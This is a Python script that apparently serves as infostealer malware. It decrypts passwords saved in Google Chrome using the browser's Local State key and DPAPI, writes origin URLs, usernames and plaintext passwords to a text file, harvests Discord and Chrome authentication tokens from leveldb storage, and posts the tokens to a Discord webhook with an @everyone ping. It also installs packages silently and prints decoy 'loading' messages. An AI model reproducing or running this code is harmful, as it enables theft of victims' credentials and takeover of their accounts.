import os
import json
import base64
import sqlite3
import re
from datetime import timezone, datetime, timedelta

WEBHOOK_URL = ''

try:
    from Crypto.Cipher import AES
except:
    os.system("pip install pycrypto --user")
    from Crypto.Cipher import AES
try:
    import win32crypt
except:
    os.system("pip install pywin32 --user")
    import win32crypt
try:
    import shutil
except:
    os.system("pip install pytest-shutil --user")
    import shutil
try:
    from urllib.request import Request, urlopen
except:
    os.system("pip install urllib3 --user ")
    os.system("pip install urllib --user ")
    from urllib.request import Request, urlopen



def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    f = open("secret.txt", "w")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:

            f.write(f"""
            Original URL: {origin_url}
            Action URL: {action_url}
            Username: {username}
            Password: {password}
            """)

        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"loading")
        if date_last_used != 86400000000 and date_last_used:
            print(f"loading")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass






def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def mains():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'DISCORD TOKEN': roaming + '\\Discord',
        #'Opera': roaming + '\\Opera Software\\Opera Stable',
        #'Discord Canary': roaming + '\\discordcanary',
        #'Discord PTB': roaming + '\\discordptb',
        'GOOGLE': local + '\\Google\\Chrome\\User Data\\Default',
        #'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        #'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        #อยากได้เพิ่มลองหาดู
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'TOKENS : {token}\n'
        else:
            message += 'No token in here\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        r = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(r)
    except:
        pass
main()
mains()
print("success !")
